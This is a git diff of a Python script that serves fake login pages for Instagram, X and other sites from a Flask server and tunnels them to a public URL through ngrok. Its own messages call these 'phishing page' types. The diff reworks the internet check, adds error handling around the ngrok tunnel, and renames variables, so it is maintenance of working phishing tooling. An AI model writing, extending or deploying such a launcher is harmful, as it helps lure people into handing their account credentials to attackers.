@@ -2,7 +2,6 @@ import logging
 from importlib import import_module as eximport
 from subprocess import run
 import os, platform, time
-from requests import head
 
 def cleaar():
     if platform.system() == "Windows":
@@ -11,23 +10,14 @@ def cleaar():
     else:
         os.system("clear")
 
-def is_internet():
-    try:
-        head("https://google.com", timeout=5)
-
-    except ConnectionError:
-            print(f"\n{purple}No internet!\a")
-            time.sleep(2)
-
-    except Exception as e:
-        print(termcolor.colored(f"{str(e)}", "red"))
-
 cleaar()
 
 green="\033[0;32m"
 purple="\033[0;35m"
+red="\033[0;31m"
+byellow="\033[1;33m"
 
-modules = ["flask", "pyngrok", "termcolor", "pyfiglet"]
+modules = ["flask", "pyngrok", "termcolor", "pyfiglet", "requests"]
 
 for module in modules:
     try:
@@ -51,6 +41,23 @@ for module in modules:
 from flask import Flask, render_template, abort
 from pyngrok import ngrok
 import termcolor, random, pyfiglet
+from requests import head
+from requests.exceptions import ConnectionError
+
+
+def is_internet():
+    try:
+        head("https://google.com", timeout=5)
+        return True
+
+    except ConnectionError:
+            print(f"\n{purple}No internet!\a")
+            time.sleep(2)
+            return False
+
+    except Exception as e:
+        print(termcolor.colored(f"{str(e)}", "red"))
+        return False
 
 
 app = Flask(__name__)
@@ -67,7 +74,7 @@ color = ["green", "yellow", "white", "cyan", "blue", "light_red", "magenta"]
 print(termcolor.colored(ascii_art, random.choice(color)))
 
 por = int(input(termcolor.colored("Enter port number here: ", "cyan")))
-e = input(termcolor.colored("Enter: ", "green")).lower()
+chhosse = input(termcolor.colored("Enter: ", "green")).lower()
 
 optiosn = {
         "insta": "instagram.html",
@@ -78,13 +85,13 @@ optiosn = {
         "x": "x.html",
     }
     
-if e in optiosn:
+if chhosse in optiosn:
     pass
 
 else:
     # abort(404)
     # raise ValueError(f"{e} not exists this type of Phishing page!")
-    print(termcolor.colored("Invalid!", "red"))
+    print(termcolor.colored("Invalid input! Please choose a valid phishing page type.", "red"))
     exit()
 
 @app.route("/")
@@ -95,12 +102,16 @@ def hello_world():
 if __name__ == "__main__":
     sss = input(termcolor.colored("\n\nAre you want we start ngrok or you start itself Y for yes N for no!: ", "red"))
 
-    if sss == "Y":
-        is_internet()
+    aa = is_internet()
 
+    if sss == "Y" and aa:
         en = input(termcolor.colored("\nEnter ngrok authtoken: ", "blue"))
         
-        public_url = ngrok.connect(por, "http")
+        try:
+            public_url = ngrok.connect(por, "http")
+
+        except Exception as e:
+            print(f"{byellow}ERROR: {red}{str(e)}")
 
         print(termcolor.colored(f"\n* Running on http://127.0.0.1:{por} \n", "light_green"))
         print(termcolor.colored(f"Public URL: {public_url} \n\n", "light_green"))
